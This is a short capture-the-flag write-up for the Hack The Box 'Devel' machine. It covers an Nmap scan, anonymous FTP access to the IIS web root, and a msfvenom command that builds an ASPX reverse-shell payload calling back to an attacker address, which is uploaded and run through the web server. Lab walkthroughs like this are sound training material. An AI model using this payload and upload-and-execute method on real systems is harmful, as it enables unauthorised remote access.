Devel without Metasploit:

![Devel](https://user-images.githubusercontent.com/55708909/91413269-7f683500-e868-11ea-8bfa-29ec7f6b1608.png)

Starting with Nmap Scan :
Nmap -sC -sV -T4 -A -O -oA Legacy -p- 10.10.10.5

![Devel_nmap](https://user-images.githubusercontent.com/55708909/91413112-492ab580-e868-11ea-9a51-ab777d532f6e.png)

As we have only two ports open we are going to enumerate these two ports

FTP anonymous login is allowed

![Devel_ftp](https://user-images.githubusercontent.com/55708909/91413595-fb627d00-e868-11ea-9607-ee58e55352cc.png)

Find out that FTP & WEB server is on the same path therefore if we upload a shell from FTP we will be able to execute through web server and get reverse shell

![Devel_web](https://user-images.githubusercontent.com/55708909/91413962-7b88e280-e869-11ea-87fc-fcb94663eeca.png)

Since it is IIS7 I guess we can upload a payload in ASP OR ASPX

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > shell.aspx

Then login in through FTP Server put it & execute it through WEB Server

Here we have a reverse shell from target machine

![Devel_flag](https://user-images.githubusercontent.com/55708909/91415706-11257180-e86c-11ea-8324-b812e92cbe25.png)










